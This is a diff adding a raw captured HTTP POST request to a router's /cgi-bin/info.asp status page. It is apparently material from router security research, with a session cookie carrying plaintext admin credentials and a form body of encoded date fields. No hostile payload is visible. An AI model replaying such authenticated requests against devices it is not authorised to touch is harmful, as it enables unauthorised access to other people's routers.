@@ -1,0 +1,15 @@
+POST /cgi-bin/info.asp?Rtabhead=Status HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 243
+Origin: http://192.168.1.1
+Connection: keep-alive
+Referer: http://192.168.1.1/cgi-bin/info.asp?Rtabhead=Status
+Cookie: SESSIONID=04d4df32; UID=admin; PSW=123
+Upgrade-Insecure-Requests: 1
+
+mtenCurrent_Date=connecting%29-undefined-server&mtenCurrent_Time=is%3Aundefined%3A51&mtenCurrent_Year=2010&mtenCurrent_Mon=01&mtenCurrent_Day=01&mtenCurrent_Hour=00&mtenCurrent_Min=00&mtenCurrent_Sec=51&DeviceInfo_PVC_Index=1&DeviceInfo_flag=5
